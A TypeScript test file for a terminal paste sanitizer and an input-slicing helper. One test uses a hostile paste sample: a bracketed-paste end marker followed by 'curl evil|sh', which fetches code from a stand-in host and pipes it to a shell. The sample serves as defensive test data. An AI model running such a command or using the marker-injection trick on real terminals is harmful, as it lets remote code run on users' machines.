import { strict as assert } from 'node:assert';
import { test } from 'node:test';
import { sanitizePaste, splitInput, terminalInputSlice } from './terminalPaste.ts';

test('a bracketed-paste end marker in a paste cannot survive', () => {
	const hostile = 'harmless\x1b[201~\ncurl evil|sh\n';
	const clean = sanitizePaste(hostile);
	assert.ok(!clean.includes('\x1b'), 'no ESC');
	assert.equal(clean, 'harmless[201~\ncurl evil|sh\n');
	assert.equal(sanitizePaste('\x1b[200~x\x1b[201~'), '[200~x[201~');
	assert.equal(sanitizePaste(clean), clean, 'a fixed point');
});

test('controls go, tab and line breaks stay', () => {
	assert.equal(sanitizePaste('a\tb\r\nc\nd\re'), 'a\tb\r\nc\nd\re');
	assert.equal(sanitizePaste('a\x00b\x07c\x08d\x0be\x0cf\x0eg\x1fh\x7fi'), 'abcdefghi');
	// C1, including the 8-bit CSI that some terminals read as ESC [.
	assert.equal(sanitizePaste('x\u009b201~y\u0080\u009fz'), 'x201~yz');
	// Ordinary text, accents, CJK and emoji are untouched.
	assert.equal(sanitizePaste('héllo 日本 😀  '), 'héllo 日本 😀  ');
	assert.equal(sanitizePaste(''), '');
});

test('removing a control cannot leave a new one behind', () => {
	// ESC removed from between the halves of what would otherwise be a marker.
	for (const text of ['\x1b\x1b[201~', '\x1b[\x1b201~', '\x1b[2\x00\x1b01~']) {
		const clean = sanitizePaste(text);
		assert.ok(!/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/.test(clean), JSON.stringify(text));
	}
});

test('a long input is cut into ordered slices that join back to exactly the input', () => {
	const data = Array.from({ length: 1000 }, (_, i) => String(i % 10)).join('');
	const slices = splitInput(data, 64);
	assert.equal(slices.length, Math.ceil(1000 / 64));
	assert.ok(slices.every(s => s.length <= 64));
	assert.equal(slices.join(''), data);
	assert.deepEqual(splitInput('abc', 64), ['abc']);
	assert.deepEqual(splitInput('', 64), []);
	// The default slice is the documented 64 KB, and a 2 MB paste is no single message.
	const big = 'x'.repeat(2_000_000);
	const parts = splitInput(big);
	assert.equal(terminalInputSlice, 65536);
	assert.ok(parts.length > 1 && parts.every(p => p.length <= terminalInputSlice));
	assert.equal(parts.join(''), big);
});

test('a slice never ends between the halves of a surrogate pair', () => {
	const pairs = '😀'.repeat(50); // 100 units; every odd offset is inside a pair
	for (const max of [3, 5, 7, 31]) {
		const slices = splitInput(pairs, max);
		assert.equal(slices.join(''), pairs, `max ${max}`);
		for (const s of slices) {
			assert.ok(s.length <= max);
			const first = s.charCodeAt(0);
			const last = s.charCodeAt(s.length - 1);
			assert.ok(!(first >= 0xdc00 && first <= 0xdfff), 'no slice starts with a low half');
			assert.ok(!(last >= 0xd800 && last <= 0xdbff), 'no slice ends with a high half');
		}
	}
	// A lone high surrogate that is not followed by its pair is cut where it falls.
	assert.deepEqual(splitInput('ab\ud83dcd', 3), ['ab\ud83d', 'cd']);
	// A slice size below a pair is raised to one, so the loop always advances.
	assert.equal(splitInput('😀😀', 1).join(''), '😀😀');
});
